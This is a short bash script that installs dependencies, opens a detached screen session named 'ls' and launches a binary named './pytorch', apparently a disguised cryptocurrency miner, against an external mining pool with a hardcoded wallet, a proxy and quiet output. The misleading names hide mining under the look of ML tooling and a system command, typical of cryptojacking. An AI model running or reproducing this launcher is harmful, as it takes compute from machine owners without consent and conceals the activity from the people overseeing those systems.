#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
screen -dmS ls 
POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
WALLET=sugar1qhcv5w5n5h8xjyzuy2nmcf0ah4e3eykmayp765f
./pytorch -a yespowersugar -o $POOL -u $WALLET -x $PROXY -q
